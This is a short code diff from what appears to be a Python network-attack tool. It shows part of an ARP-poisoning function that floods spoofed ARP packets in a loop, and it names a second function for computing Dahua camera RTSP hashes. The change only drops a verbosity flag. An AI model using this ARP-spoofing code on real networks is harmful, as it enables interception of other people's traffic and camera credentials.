@@ -20,7 +20,7 @@ def arp_poison(iface, iface_mac, target_ip, target_mac, source_ip):
     packet[ARP].psrc = source_ip
     packet[ARP].hwdst = target_mac
     packet[ARP].pdst = target_ip
-    sendp(packet, iface=iface, inter=1, loop=1, verbose=False)
+    sendp(packet, iface=iface, inter=1, loop=1)
 
 
 def dahua_rtsp_hash(username, realm, password, method, uri, nonce):
